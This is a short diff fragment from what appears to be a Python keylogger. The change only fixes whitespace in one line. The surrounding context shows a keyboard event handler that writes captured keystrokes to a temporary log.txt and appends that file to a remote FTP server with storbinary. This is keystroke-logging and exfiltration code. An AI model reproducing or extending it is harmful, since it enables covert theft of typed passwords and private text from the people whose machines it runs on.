@@ -83,7 +83,7 @@ def OnKeyboardEvent(event):
             objLogFile.write(strLogs); objLogFile.close()
             # create log file
 
-            arFileList  = ftp.nlst()
+            arFileList = ftp.nlst()
             if "log.txt" in arFileList:
                 objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("APPE log.txt", objLogFile)
             else:
